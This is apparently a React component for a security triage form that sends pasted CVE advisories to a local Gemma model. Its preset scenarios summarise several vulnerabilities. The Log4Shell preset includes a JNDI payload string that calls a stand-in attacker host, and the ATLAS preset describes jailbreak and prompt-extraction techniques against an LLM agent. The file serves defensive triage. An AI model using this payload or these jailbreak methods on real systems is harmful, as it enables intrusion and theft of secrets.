'use client';

import React, { useState } from 'react';
import { Globe, FileText, Play, Zap, Trash2, Copy, Sparkles, ArrowRight, Check } from 'lucide-react';

interface IntakeFormProps {
  onSubmitInvestigation: (inputText: string, sourceUrl?: string) => void;
  onSubmitDirectPrompt: (promptText: string) => void;
  isLoading: boolean;
}

const PRESET_SCENARIOS = [
  {
    id: 'cve-2024-38077',
    label: 'CVE-2024-38077',
    name: 'Windows RDP Heap Overflow (MadLicense)',
    category: 'Memory Corruption / RCE',
    text: `CVE ID: CVE-2024-38077
Title: Windows Remote Desktop Licensing Service Remote Code Execution Vulnerability
Severity: CRITICAL (CVSS 9.8)
Attack Vector: NETWORK (Port 135 / RPC endpoint)
Attack Complexity: LOW
Privileges Required: NONE
Description:
A remote code execution vulnerability exists in the Windows Remote Desktop Licensing service (RDL). An unauthenticated remote attacker can send specially crafted RPC packets over port 135/dynamic RPC ports to trigger a heap-based buffer overflow in the RDL service daemon, leading to SYSTEM privilege execution.
Affected Products: Windows Server 2008 through Windows Server 2022.
Exploit Primitives: RPC interface fuzzing, Heap memory spray, Shellcode execution.`,
  },
  {
    id: 'cve-2021-44228',
    label: 'Log4Shell',
    name: 'Apache Log4j2 JNDI Injection RCE',
    category: 'JNDI / Code Injection',
    text: `CVE ID: CVE-2021-44228
Title: Apache Log4j2 JNDI Remote Code Execution Vulnerability (Log4Shell)
Severity: CRITICAL (CVSS 10.0)
Attack Vector: NETWORK
Attack Complexity: LOW
Privileges Required: NONE
Description:
Apache Log4j2 versions 2.0-beta9 through 2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI-related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
Exploit Primitives: JNDI Lookup string \${jndi:ldap://attacker.com/a}, LDAP payload deserialization.`,
  },
  {
    id: 'cve-2024-37032',
    label: 'Probllama',
    name: 'Ollama Remote Model File Path Traversal RCE',
    category: 'AI Infrastructure / RCE',
    text: `CVE ID: CVE-2024-37032
Title: Ollama API Path Traversal Remote Code Execution (Probllama)
Severity: CRITICAL (CVSS 9.3)
Attack Vector: NETWORK
Attack Complexity: LOW
Privileges Required: NONE
Description:
Ollama versions prior to 0.1.34 fail to adequately sanitize model manifest file paths during the model pull API call (/api/pull). An unauthenticated attacker can supply a malicious manifest with relative directory traversal characters (../../) to write arbitrary binary files and shared libraries into system directories, resulting in arbitrary code execution under the Ollama server process.
Exploit Primitives: Directory traversal, arbitrary file write, library injection.`,
  },
  {
    id: 'atlas-prompt-egress',
    label: 'MITRE ATLAS',
    name: 'LLM Prompt Extraction & Model Weight Egress',
    category: 'AI Security / ATLAS',
    text: `Advisory: AML.T0051 & AML.T0024 LLM System Prompt and Sensitive Parameter Egress
Severity: HIGH (CVSS 8.2)
Target: Enterprise Agentic LLM Application
Description:
Adversary uses recursive role-play escaping and token-smuggling jailbreak techniques to bypass system prompt alignment guards in the conversational agent. By prompting the model to summarize its internal instructions in hex-encoded base64 format, the attacker extracts proprietary intellectual property, internal API tokens, and confidential system instructions without triggering keyword-based safety filters.
Exploit Primitives: Indirect Prompt Injection, Context Escape, Data Exfiltration via outbound reasoning channel.`,
  },
];

export default function IntakeForm({
  onSubmitInvestigation,
  onSubmitDirectPrompt,
  isLoading,
}: IntakeFormProps) {
  const [urlInput, setUrlInput] = useState('');
  const [textAreaContent, setTextAreaContent] = useState('');
  const [copiedScenario, setCopiedScenario] = useState<string | null>(null);

  // URL handler: repeats/inserts URL into the text area without processing as requested
  const handleInsertUrl = () => {
    if (!urlInput.trim()) return;
    const urlStr = urlInput.trim();
    setTextAreaContent((prev) => {
      if (!prev.trim()) {
        return `Target Advisory URL:\n${urlStr}\n\n[Advisory content pending ingestion]`;
      }
      return `${prev}\n\nTarget Advisory URL: ${urlStr}`;
    });
    setUrlInput('');
  };

  const handleSelectScenario = (scenario: (typeof PRESET_SCENARIOS)[0]) => {
    setTextAreaContent(scenario.text);
    setCopiedScenario(scenario.id);
    setTimeout(() => setCopiedScenario(null), 2000);
  };

  const handleClear = () => {
    setTextAreaContent('');
    setUrlInput('');
  };

  const handleRunInvestigation = () => {
    if (!textAreaContent.trim() || isLoading) return;
    onSubmitInvestigation(textAreaContent.trim(), urlInput.trim() || undefined);
  };

  const handleRunDirectPrompt = () => {
    if (!textAreaContent.trim() || isLoading) return;
    onSubmitDirectPrompt(textAreaContent.trim());
  };

  return (
    <div className="bg-white border border-[#dadce0] rounded-2xl p-6 shadow-google-card transition-all">
      {/* Top Bar: Title and Quick Presets */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-[#f1f3f4]">
        <div>
          <h2 className="text-lg font-semibold text-[#202124] flex items-center gap-2">
            <FileText className="w-5 h-5 text-[#1a73e8]" />
            <span>Vulnerability Intake & Triage Prompt</span>
          </h2>
          <p className="text-xs text-[#5f6368] mt-0.5">
            Paste a CVE report, security advisory, or incident log to trigger autonomous investigation or direct inference.
          </p>
        </div>

        {/* Quick Scenario Preset Chips */}
        <div className="flex items-center gap-1.5 flex-wrap">
          <span className="text-[11px] font-semibold text-[#5f6368] uppercase tracking-wider mr-1">
            Presets:
          </span>
          {PRESET_SCENARIOS.map((sc) => (
            <button
              key={sc.id}
              type="button"
              onClick={() => handleSelectScenario(sc)}
              className="text-xs font-medium px-2.5 py-1 rounded-full bg-[#f8f9fa] border border-[#dadce0] hover:border-[#1a73e8] hover:bg-[#e8f0fe] hover:text-[#1a73e8] text-[#3c4043] transition-all flex items-center gap-1"
            >
              {copiedScenario === sc.id ? (
                <Check className="w-3 h-3 text-[#1e8e3e]" />
              ) : (
                <Sparkles className="w-3 h-3 text-[#fbbc04]" />
              )}
              <span>{sc.label}</span>
            </button>
          ))}
        </div>
      </div>

      {/* URL Input Bar */}
      <div className="mt-4">
        <label className="block text-xs font-medium text-[#5f6368] mb-1.5 flex items-center gap-1">
          <Globe className="w-3.5 h-3.5 text-[#1a73e8]" />
          <span>Web URL Input (Optional)</span>
        </label>
        <div className="flex gap-2">
          <div className="relative flex-1">
            <input
              type="url"
              value={urlInput}
              onChange={(e) => setUrlInput(e.target.value)}
              placeholder="https://nvd.nist.gov/vuln/detail/CVE-... or advisory link"
              className="w-full text-xs sm:text-sm px-3.5 py-2.5 bg-[#f8f9fa] border border-[#dadce0] rounded-xl text-[#202124] placeholder-[#80868b] focus:bg-white focus:outline-none focus:border-[#1a73e8] focus:ring-2 focus:ring-[#1a73e8]/20 transition-all"
            />
          </div>
          <button
            type="button"
            onClick={handleInsertUrl}
            className="px-4 py-2.5 text-xs font-semibold bg-[#f1f3f4] hover:bg-[#e8eaed] text-[#3c4043] border border-[#dadce0] rounded-xl flex items-center gap-1.5 transition-colors whitespace-nowrap active:scale-95"
          >
            <ArrowRight className="w-3.5 h-3.5 text-[#1a73e8]" />
            <span>Insert to Textbox</span>
          </button>
        </div>
      </div>

      {/* Large Text Area */}
      <div className="mt-4">
        <div className="flex items-center justify-between mb-1.5">
          <label className="text-xs font-medium text-[#5f6368] flex items-center gap-1">
            <span>Investigation Advisory / Incident Telemetry</span>
            <span className="text-[#80868b] font-normal">({textAreaContent.length} characters)</span>
          </label>
          {textAreaContent && (
            <button
              type="button"
              onClick={handleClear}
              className="text-xs text-[#d93025] hover:text-[#b31412] flex items-center gap-1 font-medium"
            >
              <Trash2 className="w-3 h-3" />
              <span>Clear</span>
            </button>
          )}
        </div>
        <textarea
          rows={7}
          value={textAreaContent}
          onChange={(e) => setTextAreaContent(e.target.value)}
          placeholder="Paste security advisory, CVE details, stack traces, or custom exploit prompt here..."
          className="w-full text-xs sm:text-sm font-mono p-4 bg-[#f8f9fa] border border-[#dadce0] rounded-xl text-[#202124] placeholder-[#80868b] focus:bg-white focus:outline-none focus:border-[#1a73e8] focus:ring-2 focus:ring-[#1a73e8]/20 transition-all resize-y"
        />
      </div>

      {/* Action Buttons Footer */}
      <div className="mt-5 pt-4 border-t border-[#f1f3f4] flex flex-col sm:flex-row items-center justify-between gap-3">
        <div className="text-xs text-[#5f6368] flex items-center gap-1.5">
          <span className="w-2 h-2 rounded-full bg-[#1a73e8]"></span>
          <span>Powered by Local Gemma & Cyber Threat Intel RAG</span>
        </div>

        <div className="flex items-center gap-3 w-full sm:w-auto">
          <button
            type="button"
            disabled={!textAreaContent.trim() || isLoading}
            onClick={handleRunDirectPrompt}
            className="flex-1 sm:flex-none px-4 py-2.5 text-xs sm:text-sm font-semibold rounded-xl bg-white hover:bg-[#f8f9fa] text-[#1a73e8] border border-[#dadce0] hover:border-[#1a73e8] shadow-sm disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2 active:scale-95 transition-all"
          >
            <Zap className="w-4 h-4 text-[#fbbc04]" />
            <span>Ask Gemma (Fast)</span>
          </button>

          <button
            type="button"
            disabled={!textAreaContent.trim() || isLoading}
            onClick={handleRunInvestigation}
            className="flex-1 sm:flex-none px-6 py-2.5 text-xs sm:text-sm font-semibold rounded-xl bg-[#1a73e8] hover:bg-[#1557b0] text-white shadow-md hover:shadow-lg disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2 active:scale-95 transition-all"
          >
            <Play className={`w-4 h-4 ${isLoading ? 'animate-spin' : ''}`} />
            <span>{isLoading ? 'Running Pipeline...' : 'Run Autonomous Triage'}</span>
          </button>
        </div>
      </div>
    </div>
  );
}
